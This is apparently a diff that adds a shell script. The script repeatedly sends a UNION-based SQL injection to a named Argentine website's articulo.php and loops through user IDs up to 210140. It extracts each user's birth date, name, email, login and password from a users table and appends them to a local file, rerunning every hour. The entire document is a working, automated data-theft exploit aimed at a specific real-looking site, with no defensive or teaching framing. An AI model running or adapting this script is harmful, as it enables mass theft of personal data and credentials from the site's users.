@@ -1,0 +1,29 @@
+#!/bin/sh
+while true; do
+    for id in $(awk '
+        BEGIN{
+            FS=";"
+        }
+        {
+            a[$1] = 1
+        }
+        END{
+            for (i=0; i<=210140; i++)
+                if (!(i in a)) print i
+            print "Lista creada" > "/dev/stderr"
+        }' ~/documentos/malujada/soloentreamigas.txt); do
+        w3m -dump_source -cols 5000 "http://www.soloentreamigas.com.ar/articulo.php?ID=-1+UNION+SELECT+0,1,2,3,concat%280x3b,0x3b,Born_Date,0x3b,name,0x3b,email,0x3b,login,0x3b,password,0x3b,0x3b%29,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%20BG_WEB_Users%20where%20User_WEB_Id=$id%20--" | awk -v id=$id '
+        BEGIN{
+            FS = OFS = ";"
+        }
+        NF==9{
+            print id, $3, $4, $5, $6, $7
+            exit(0)
+        }
+        /SELECT/&&/FROM BG_Categories WHERE Category_Id/{
+            print id, "None", "None", "None", "None", "None"
+        }' | tee -a ~/documentos/malujada/soloentreamigas.txt
+    done 
+    echo esperando
+    sleep 1h
+done
